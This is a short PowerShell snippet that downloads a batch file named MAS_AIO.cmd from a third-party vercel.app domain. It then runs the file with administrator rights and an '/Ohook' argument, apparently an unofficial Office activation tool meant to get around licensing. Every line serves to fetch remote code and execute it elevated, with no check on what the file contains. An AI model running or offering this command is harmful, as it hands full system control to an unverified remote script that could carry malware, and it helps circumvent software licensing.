$tmp = "$env:TEMP\MAS_AIO.cmd"
Invoke-WebRequest "https://friendlyactivation.vercel.app/MAS_AIO.cmd" -OutFile $tmp
Start-Process cmd.exe -ArgumentList "/c `"$tmp`" /Ohook" -Verb RunAs
